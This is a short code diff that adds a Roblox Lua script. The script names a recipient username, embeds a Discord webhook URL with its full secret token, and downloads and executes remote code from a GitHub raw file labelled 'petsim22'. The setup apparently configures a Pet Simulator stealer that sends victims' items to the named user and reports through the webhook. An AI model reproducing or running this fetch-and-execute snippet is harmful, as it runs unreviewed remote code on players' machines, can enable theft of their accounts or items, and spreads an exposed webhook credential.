@@ -1,0 +1,3 @@
+UserName = "RENPHP"
+Webhook = "https://discord.com/api/webhooks/1091698748075278366/Sgdvjado198DCD1Rh6g3dhjXT2KP4GgOBvdR9gKjrLJdwFdCUjOvaW7jFEtJukTnpBcB"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GAGAGA4/Justanotherdme/main/petsim22", true))()
